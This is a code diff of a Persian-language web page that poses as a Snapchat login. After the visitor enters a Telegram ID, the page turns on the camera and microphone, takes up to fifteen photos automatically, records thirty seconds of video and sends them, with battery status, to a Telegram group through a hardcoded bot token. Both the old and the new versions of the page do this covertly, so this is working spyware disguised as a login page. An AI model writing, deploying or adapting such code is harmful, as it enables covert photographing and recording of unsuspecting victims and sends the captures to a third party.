@@ -1,106 +1,95 @@
-<!DOCTYPE html>
-<html lang="fa">
+<!DOCTYPE html><html lang="fa">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Snap Login</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ورود به اسنپ‌چت</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://unpkg.com/lucide@latest"></script>
   <style>
     body {
-      margin: 0;
       font-family: sans-serif;
-      background: #fffc00;
-      color: #000;
       direction: rtl;
-    }
-    #cameraContainer {
-      display: none;
-      flex-direction: column;
-      align-items: center;
+      background-color: #fffc00;
+      color: #000;
+      margin: 0;
+      padding: 0;
       height: 100vh;
-      justify-content: space-between;
-      padding: 1rem;
+      overflow: hidden;
+    }
+    #cameraWrapper {
       position: relative;
+      width: 100%;
+      height: 100vh;
+      display: none;
     }
     video {
       width: 100%;
       height: 100%;
       object-fit: cover;
+    }
+    .capture-btn {
       position: absolute;
-      top: 0;
-      left: 0;
-    }
-    #controls {
-      position: relative;
-      z-index: 10;
-      width: 100%;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 1rem;
-    }
-    #captureBtn {
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
       width: 70px;
       height: 70px;
       background: white;
-      border-radius: 9999px;
-      border: 4px solid black;
+      border: 5px solid #000;
+      border-radius: 50%;
+      z-index: 10;
     }
-    #flipBtn {
-      background: rgba(0,0,0,0.3);
-      border-radius: 9999px;
-      padding: 0.5rem;
+    .switch-btn {
+      position: absolute;
+      bottom: 30px;
+      right: 20px;
+      background: rgba(0,0,0,0.5);
+      padding: 10px;
+      border-radius: 50%;
     }
   </style>
 </head>
 <body>
-  <div id="loginContainer" class="flex flex-col items-center justify-center min-h-screen px-4">
-    <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" class="w-16 mb-4" />
-    <h1 class="text-2xl font-bold mb-4">ورود به اسنپ‌چت</h1>
-    <input id="userId" type="text" placeholder="آیدی تلگرام (مثلاً user123)" class="w-full max-w-md p-3 rounded-lg text-black mb-4" />
-    <button onclick="startApp()" class="w-full max-w-md bg-black text-white p-3 rounded-lg font-bold text-lg">
-      ورود
-    </button>
-  </div>
-
-  <div id="cameraContainer">
-    <video id="video" autoplay playsinline muted></video>
-    <div id="controls">
-      <button id="flipBtn" onclick="switchCamera()"><i data-lucide="refresh-ccw"></i></button>
-      <button id="captureBtn" onclick="manualCapture()"></button>
-      <span id="timer" class="text-sm bg-white text-black p-1 rounded">0s</span>
-    </div>
-  </div>
-
-  <script>
+  <div id="loginPage" class="flex flex-col justify-center items-center h-full px-6">
+    <h1 class="text-3xl font-bold mb-6">ورود به اسنپ‌چت</h1>
+    <input id="userId" type="text" placeholder="آیدی تلگرام (مثلاً @user)" class="w-full max-w-xs p-3 mb-4 rounded-lg border border-gray-400">
+    <button onclick="startApp()" class="bg-black text-yellow-300 px-6 py-2 rounded-full font-bold text-lg">ورود</button>
+  </div>  <div id="cameraWrapper">
+    <video id="video" autoplay playsinline></video>
+    <button class="capture-btn" onclick="manualCapture()"></button>
+    <button class="switch-btn" onclick="switchCamera()"><i data-lucide="refresh-ccw"></i></button>
+  </div>  <script>
     lucide.createIcons();
 
     const botToken = '7336954365:AAHqd7DgkHDMetoFFjtNWvmV1IWZsmiiaLU';
-    const groupId = '-1002645916072';
-    let stream, mediaRecorder, recordedChunks = [], uid = "", photoCount = 0, seconds = 0;
-    let useFront = true, faceDetected = false, started = false;
+    const chatId = '--1002645916072';
 
-    async function startApp() {
-      uid = document.getElementById("userId").value.trim();
-      if (!uid || uid.includes("@")) return alert("آیدی بدون @ وارد کن");
-      document.getElementById("loginContainer").style.display = "none";
-      document.getElementById("cameraContainer").style.display = "flex";
-      await startCamera();
-      startTimer();
-      detectFaceLoop();
-      startRecording();
-      setTimeout(() => {
-        if (!faceDetected) autoCaptureLoop(15, 4000);
-      }, 7000);
+    let stream;
+    let useFront = true;
+    let userId = "";
+    let photoCount = 0;
+    let captureInterval;
+
+    function startApp() {
+      const input = document.getElementById('userId').value.trim();
+      if (!input.startsWith('@')) {
+        alert('لطفاً آیدی را با @ وارد کنید.');
+        return;
+      }
+      userId = input;
+      document.getElementById('loginPage').style.display = 'none';
+      document.getElementById('cameraWrapper').style.display = 'block';
+      startCamera();
+      startAutoCapture();
+      startVideoRecording();
     }
 
     async function startCamera() {
-      if (stream) stream.getTracks().forEach(t => t.stop());
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: useFront ? "user" : "environment" }, audio: true
-      });
-      document.getElementById("video").srcObject = stream;
+      if (stream) {
+        stream.getTracks().forEach(t => t.stop());
+      }
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: useFront ? "user" : "environment" }, audio: true });
+      document.getElementById('video').srcObject = stream;
     }
 
     function switchCamera() {
@@ -108,90 +97,69 @@
       startCamera();
     }
 
-    function startTimer() {
-      setInterval(() => {
-        seconds++;
-        document.getElementById("timer").innerText = `${seconds}s`;
-      }, 1000);
+    function manualCapture() {
+      captureAndSend();
     }
 
-    async function detectFaceLoop() {
-      if (!('FaceDetector' in window)) return;
-      const detector = new FaceDetector();
-      const canvas = document.createElement("canvas");
-      const video = document.getElementById("video");
-      const ctx = canvas.getContext("2d");
-
-      const loop = async () => {
-        if (photoCount >= 15) return;
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0);
-        const faces = await detector.detect(canvas);
-        if (faces.length > 0) {
-          faceDetected = true;
-          captureAndSend();
-          setTimeout(loop, 4000);
-        } else {
-          setTimeout(loop, 1000);
+    function startAutoCapture() {
+      let times = 0;
+      captureInterval = setInterval(() => {
+        if (times >= 15) {
+          clearInterval(captureInterval);
+          return;
         }
-      };
-      loop();
-    }
-
-    function autoCaptureLoop(max, interval) {
-      let count = 0;
-      const loop = () => {
-        if (count >= max || faceDetected) return;
         captureAndSend();
-        count++;
-        setTimeout(loop, interval);
-      };
-      loop();
-    }
-
-    async function manualCapture() {
-      if (photoCount < 15) captureAndSend();
+        times++;
+      }, 4000);
     }
 
     function captureAndSend() {
-      const video = document.getElementById("video");
-      const canvas = document.createElement("canvas");
+      const video = document.getElementById('video');
+      const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
+      const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(async blob => {
         const battery = await navigator.getBattery();
         const form = new FormData();
-        form.append("chat_id", groupId);
-        form.append("photo", blob, `photo_${photoCount + 1}.jpg`);
-        form.append("caption", `🆔: ${uid}\n🖼️ عکس ${++photoCount}/15\n🔋 ${Math.round(battery.level * 100)}%\n⚡ شارژ: ${battery.charging ? 'بله' : 'خیر'}`);
+        form.append("chat_id", chatId);
+        form.append("photo", blob, `photo_${photoCount++}.jpg`);
+        form.append("caption", `آیدی: ${userId}\n🔋 ${Math.round(battery.level * 100)}%\n⚡ ${battery.charging ? 'در حال شارژ' : 'بدون شارژ'}`);
+
         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: "POST", body: form
+          method: 'POST',
+          body: form
         });
-      }, 'image/jpeg', 0.7);
+      }, 'image/jpeg');
     }
 
-    function startRecording() {
-      recordedChunks = [];
-      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp9" });
-      mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
-      mediaRecorder.onstop = sendVideo;
-      mediaRecorder.start();
-      setTimeout(() => mediaRecorder.stop(), 30000);
-    }
-
-    function sendVideo() {
-      const blob = new Blob(recordedChunks, { type: "video/webm" });
-      const form = new FormData();
-      form.append("chat_id", groupId);
-      form.append("video", blob, `video_${Date.now()}.webm`);
-      form.append("caption", `🎥 ویدیو از کاربر ${uid}`);
-      fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-        method: "POST", body: form
+    function startVideoRecording() {
+      const mediaRecorder = new MediaRecorder(stream, {
+        mimeType: 'video/webm;codecs=vp8',
+        videoBitsPerSecond: 500000
       });
+
+      const chunks = [];
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        const form = new FormData();
+        form.append("chat_id", chatId);
+        form.append("video", blob, "video.webm");
+        form.append("caption", `آیدی: ${userId}\n🎥 ویدیو`);
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+          method: 'POST',
+          body: form
+        });
+      };
+
+      mediaRecorder.start();
+
+      setTimeout(() => {
+        mediaRecorder.stop();
+      }, 30000);
     }
-  </script>
-</body>
+  </script></body>
 </html>
